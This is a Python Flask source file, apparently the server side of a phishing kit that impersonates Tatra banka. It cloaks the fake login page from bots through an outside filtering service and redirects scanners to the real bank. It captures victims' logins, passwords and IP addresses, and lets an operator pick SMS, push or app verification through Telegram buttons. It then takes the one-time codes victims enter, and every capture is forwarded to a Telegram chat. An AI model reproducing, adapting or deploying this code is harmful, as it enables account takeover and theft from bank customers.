from flask import Flask, render_template, request, jsonify, redirect
import requests
import os
import json
import time

app = Flask(__name__)

# Telegram настройки
BOT_TOKEN = os.environ.get('BOT_TOKEN', '**********************************************')
CHAT_ID = os.environ.get('CHAT_ID', '-1004305383720')

# Cloaker настройки
CLOAKER_URL = os.environ.get('CLOAKER_URL', 'https://cloaker-production-6d6b.up.railway.app')
SAFE_URL = os.environ.get('SAFE_URL', 'https://www.tatrabanka.sk')  # Куда редиректить ботов
BOT_THRESHOLD = int(os.environ.get('BOT_THRESHOLD', '40'))  # Порог для определения бота

def check_visitor(ip, user_agent, headers, domain):
    """Проверяет посетителя через cloaker и возвращает action"""
    try:
        print(f"[CLOAKER] Checking {ip} for domain {domain} via {CLOAKER_URL}")
        response = requests.post(
            f"{CLOAKER_URL}/api/v1/check",
            json={
                "ip": ip,
                "user_agent": user_agent,
                "headers": {k: v for k, v in headers},
                "domain": domain
            },
            timeout=5
        )
        print(f"[CLOAKER] Response: {response.status_code} - {response.text[:200]}")
        if response.status_code == 200:
            data = response.json()
            action = data.get('action', 'article')
            print(f"[CLOAKER] Action: {action}")
            return action, data
    except Exception as e:
        print(f"[CLOAKER] Error: {e}")
    return 'article', {}  # По умолчанию показываем статью (безопасно)

# Хранилище состояний пользователей (в production используй Redis)
user_states = {}

def send_telegram_with_buttons(message, session_id):
    """Отправляет сообщение с inline кнопками"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "📱 SMS", "callback_data": f"method:SMS:{session_id}"},
                {"text": "🔔 Push", "callback_data": f"method:Push:{session_id}"}
            ],
            [
                {"text": "📲 Tatra Mobile Banking", "callback_data": f"method:TATRA:{session_id}"}
            ]
        ]
    }
    
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": json.dumps(keyboard)
    }
    
    try:
        requests.post(url, data=data)
    except:
        pass

def send_telegram(message):
    """Отправляет обычное сообщение"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=data)
    except:
        pass

def answer_callback(callback_id, text):
    """Отвечает на нажатие кнопки"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {
        "callback_query_id": callback_id,
        "text": text
    }
    try:
        requests.post(url, data=data)
    except:
        pass

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', '')
    domain = request.host.split(':')[0]  # Получаем домен без порта
    
    # Проверяем через cloaker - он решает что показать
    action, data = check_visitor(ip, user_agent, request.headers, domain)
    
    if action == 'bank':
        # Показываем банк
        return render_template('index.html')
    elif action == 'redirect':
        # Редирект на указанный URL
        redirect_url = data.get('redirect_url', SAFE_URL)
        return redirect(redirect_url)
    elif action == 'block':
        # Блокируем
        return "Access Denied", 403
    else:
        # По умолчанию статья (article)
        return render_template('article.html')

@app.route('/submit_login', methods=['POST'])
def submit_login():
    data = request.json
    login = data.get('login', '')
    password = data.get('password', '')
    session_id = data.get('session_id', str(int(time.time() * 1000)))
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    
    # Сохраняем состояние - ждём выбора метода
    user_states[session_id] = {
        'login': login,
        'password': password,
        'status': 'waiting_method',
        'method': None,
        'ip': ip
    }
    
    message = f"""💜 <b>TATRA Bank - Nové údaje</b>

👤 <b>Login:</b> <code>{login}</code>
🔑 <b>Heslo:</b> <code>{password}</code>

🌐 <b>IP:</b> {ip}
📱 <b>UA:</b> {user_agent[:50]}...

⬇️ <b>Vyberte metódu overenia:</b>"""
    
    send_telegram_with_buttons(message, session_id)
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/check_status', methods=['POST'])
def check_status():
    """Клиент проверяет, был ли выбран метод"""
    data = request.json
    session_id = data.get('session_id', '')
    
    if session_id in user_states:
        state = user_states[session_id]
        if state['status'] == 'method_selected':
            method = state['method']
            # Сбрасываем статус для следующего этапа
            user_states[session_id]['status'] = 'waiting_code'
            return jsonify({"status": "ready", "method": method})
    
    return jsonify({"status": "waiting"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    session_id = data.get('session_id', '')
    code = data.get('code', '')
    method = data.get('method', 'SMS')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    login = ''
    if session_id in user_states:
        login = user_states[session_id].get('login', '')
    
    message = f"""💜 <b>TATRA Bank - Overovací kód</b>

👤 <b>Login:</b> <code>{login}</code>
🔢 <b>Metóda:</b> {method}
📲 <b>Kód:</b> <code>{code}</code>

🌐 <b>IP:</b> {ip}"""
    
    send_telegram(message)
    
    # Очищаем состояние
    if session_id in user_states:
        del user_states[session_id]
    
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    """Обработка нажатий кнопок из Telegram"""
    data = request.json
    
    if 'callback_query' in data:
        callback = data['callback_query']
        callback_id = callback['id']
        callback_data = callback.get('data', '')
        
        # Парсим callback_data: method:SMS:session_id
        parts = callback_data.split(':')
        if len(parts) >= 3 and parts[0] == 'method':
            method = parts[1]
            session_id = parts[2]
            
            method_names = {
                'SMS': 'SMS správa',
                'Push': 'Push notifikácia', 
                'TATRA': 'Tatra Mobile Banking'
            }
            
            if session_id in user_states:
                user_states[session_id]['status'] = 'method_selected'
                user_states[session_id]['method'] = method
                
                answer_callback(callback_id, f"✅ Vybrané: {method_names.get(method, method)}")
                
                # Отправляем подтверждение
                login = user_states[session_id].get('login', '')
                send_telegram(f"💜 Metóda <b>{method_names.get(method, method)}</b> bola odoslaná používateľovi <code>{login}</code>")
            else:
                answer_callback(callback_id, "⚠️ Relácia vypršala")
    
    return jsonify({"ok": True})

@app.route('/set_webhook')
def set_webhook():
    """Установить webhook (вызвать один раз после деплоя)"""
    # Используем HTTPS явно
    host = request.host
    webhook_url = f"https://{host}/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return jsonify(response.json())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
